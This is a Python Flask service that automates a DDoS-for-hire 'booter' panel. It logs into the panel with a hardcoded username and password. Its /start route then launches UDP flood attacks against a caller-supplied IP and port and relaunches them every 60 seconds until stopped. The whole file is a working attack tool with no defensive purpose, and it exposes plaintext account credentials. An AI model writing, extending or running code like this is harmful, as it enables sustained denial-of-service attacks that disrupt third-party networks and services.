from flask import Flask, request, jsonify
import httpx
import asyncio
import threading
import time
import re

app = Flask(__name__)

# --- CONFIG ---
BASE_URL = "https://hardstresser.org"
USERNAME = "SajagOG1"
PASSWORD = "Jaiisbeast@1"
DEFAULT_TIME = "60"

# active_tasks now uses the SITE_ID as the key
active_tasks = {}

HEADERS = {
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "referer": f"{BASE_URL}/panel/booter.php"
}

async def get_latest_id(client):
    """Sniper for the ID on Line 84 (the aXXXX pattern)."""
    try:
        resp = await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/attacks.php")
        match = re.search(r'a(\d{5,8})', resp.text)
        if match: return match.group(1)
        return None
    except: return None

async def attack_loop(site_id, ip, port):
    """Indefinite reloader logic using the Site ID."""
    async with httpx.AsyncClient(headers=HEADERS, follow_redirects=True, timeout=40.0) as client:
        # Initial login
        await client.post(f"{BASE_URL}/panel/login.php", data={"kullaniciadi": USERNAME, "sifreniz": PASSWORD})
        
        current_id = site_id
        while current_id in active_tasks:
            # Wait for the duration of the attack
            expire_at = time.time() + int(DEFAULT_TIME)
            while time.time() < expire_at:
                if current_id not in active_tasks:
                    # KILL COMMAND
                    await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/hub.php", 
                                     params={"type": "stop", "id": current_id})
                    return
                await asyncio.sleep(1)

            # Relaunch Sequence
            if current_id in active_tasks:
                p = {"type": "start", "host": ip, "port": port, "time": DEFAULT_TIME, "method": "UDP", "vip": "0"}
                await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/hub.php", params=p)
                await asyncio.sleep(2)
                
                new_id = await get_latest_id(client)
                if new_id and new_id != current_id:
                    # Update the dictionary mapping to the new ID
                    active_tasks[new_id] = active_tasks.pop(current_id)
                    current_id = new_id
                else:
                    await asyncio.sleep(5) # Retry delay if launch failed

@app.route('/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    
    if not ip or not port:
        return jsonify({"status": "error", "message": "IP and Port required"}), 400

    async def get_initial_id():
        async with httpx.AsyncClient(headers=HEADERS, follow_redirects=True, timeout=40.0) as client:
            await client.post(f"{BASE_URL}/panel/login.php", data={"kullaniciadi": USERNAME, "sifreniz": PASSWORD})
            p = {"type": "start", "host": ip, "port": port, "time": DEFAULT_TIME, "method": "UDP", "vip": "0"}
            await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/hub.php", params=p)
            await asyncio.sleep(2)
            return await get_latest_id(client)

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        site_id = loop.run_until_complete(get_initial_id())

        if not site_id:
            return jsonify({"status": "error", "message": "Attack sent but Site ID not found. Panel might be full."}), 500

        # Register the Site ID as the task reference
        active_tasks[site_id] = {"ip": ip, "port": port}

        # Start the reloader thread
        t = threading.Thread(target=lambda: asyncio.run(attack_loop(site_id, ip, port)))
        t.daemon = True
        t.start()

        return jsonify({
            "status": "success",
            "taskid": site_id, # This is now the REAL ID from the site
            "target": f"{ip}:{port}"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/stop', methods=['GET'])
def stop_attack():
    task_id = request.args.get('taskid') # This will be the Site ID (e.g., 217883)
    if task_id in active_tasks:
        del active_tasks[task_id]
        return jsonify({"status": "success", "message": f"Site ID {task_id} stopped."})
    return jsonify({"status": "error", "message": "ID not active or already finished."}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
